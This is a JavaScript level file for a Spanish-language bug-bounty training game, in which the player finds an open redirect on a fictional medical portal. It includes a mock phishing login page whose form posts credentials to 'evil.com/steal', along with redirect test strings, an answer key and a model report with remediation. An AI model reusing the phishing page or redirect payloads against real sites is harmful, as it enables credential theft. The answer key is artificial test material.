// ============================================================
// bb-04-open-redirect.js — Caso Bug Bounty: Open Redirect
// El jugador descubre que el parámetro redirect acepta
// cualquier URL, permitiendo phishing y robo de credenciales.
// ============================================================

export default {
  id: "bb-redirect-01",
  titulo: "Open Redirect — Phishing vía redirección",
  tipo: "open_redirect",
  severidad: "BAJA",
  nivel: 1,
  sla: 1200,
  xp: 250,
  bounty: 300,
  briefing: [
    "Programa de bug bounty: HealthPortal (portal médico)",
    "Scope: *.healthportal.es",
    "Has notado que el login usa un parámetro redirect para volver después del login.",
    "",
    "Usa `recon healthportal.es` para explorar.",
    "Usa `test redirect <url>` para probar si acepta URLs externas.",
    "Si funciona, `exploit redirect` para demostrar el phishing.",
    "Finalmente: `report` para generar el reporte.",
    "",
    "Open Redirect puede usarse para phishing de credenciales.",
  ].join("\n"),

  fs: {
    // Página principal
    "/target/index.html": [
      "<!DOCTYPE html>",
      "<html>",
      "<head><title>HealthPortal</title></head>",
      "<body>",
      "  <h1>HealthPortal - Tu portal médico</h1>",
      '  <a href="/login?redirect=/dashboard">Acceder</a>',
      "</body>",
      "</html>",
    ].join("\n"),

    // Login con redirect
    "/target/login.html": [
      "<!DOCTYPE html>",
      "<html>",
      "<head><title>Login - HealthPortal</title></head>",
      "<body>",
      "  <h1>Iniciar Sesión</h1>",
      '  <form method="POST" action="/auth/login">',
      '    <input name="email" placeholder="Email" />',
      '    <input name="password" type="password" placeholder="Password" />',
      '    <input type="hidden" name="redirect" value="/dashboard" />',
      '    <button type="submit">Entrar</button>',
      "  </form>",
      "  <p><small>Sistema de autenticación v2.1</small></p>",
      "</body>",
      "</html>",
    ].join("\n"),

    // Dashboard
    "/target/dashboard.html": [
      "<!DOCTYPE html>",
      "<html>",
      "<head><title>Dashboard - HealthPortal</title></head>",
      "<body>",
      "  <h1>Mi Panel</h1>",
      "  <p>Paciente: Juan López</p>",
      "  <p>Histórico: Asma, Hipertensión</p>",
      "  <p>Próxima cita: 15/09/2026</p>",
      "</body>",
      "</html>",
    ].join("\n"),

    // Página de phishing del atacante
    "/target/evil-login.html": [
      "<!DOCTYPE html>",
      "<html>",
      "<head><title>HealthPortal - Verificar cuenta</title></head>",
      "<body>",
      "  <h1>Verificación de cuenta requerida</h1>",
      "  <p>Tu sesión ha expirado. Por favor, inicia sesión de nuevo.</p>",
      '  <form method="POST" action="https://evil.com/steal">',
      '    <input name="email" placeholder="Email" />',
      '    <input name="password" type="password" placeholder="Password" />',
      '    <button type="submit">Verificar</button>',
      "  </form>",
      "  <p><small>HealthPortal Security Team</small></p>",
      "</body>",
      "</html>",
    ].join("\n"),
  },

  objetivos: [
    {
      tipo: "recon",
      id: "descubrir-login",
      descripcion: "Descubrir la página de login",
      puntos: 50,
    },
    {
      tipo: "test",
      id: "probar-redirect",
      descripcion: "Probar si el parámetro redirect acepta URLs externas",
      puntos: 100,
    },
    {
      tipo: "exploit",
      id: "demostrar-phishing",
      descripcion: "Demostrar phishing vía redirección",
      puntos: 150,
    },
    {
      tipo: "report",
      id: "generar-reporte",
      descripcion: "Generar reporte con PoC",
      puntos: 100,
    },
  ],

  soluciones: {
    recon: [
      "recon healthportal.es",
      "scan healthportal.es",
    ],
    redirect: [
      "test redirect https://evil.com",
      "test redirect //evil.com",
    ],
    exploit: [
      "exploit redirect",
    ],
    report: [
      "report",
    ],
  },

  evidencias: {
    "redirect-vulnerable": "/target/login?redirect=https://evil.com",
    "phishing-page": "/target/evil-login.html",
  },

  informeEsperado: {
    titulo: "Open Redirect en HealthPortal",
    tipo: "Open Redirect / URL Redirection",
    severidad: "BAJA",
    endpoint: "/login?redirect=",
    impacto: "Phishing de credenciales médicas, suplantación de identidad",
    remediacion: "Implementar whitelist de URLs permitidas para redirección. No aceptar URLs externas.",
  },

  bonusReporte: {
    conPoC: 50,
    conImpactoClaro: 50,
    conRemediacion: 50,
  },
};
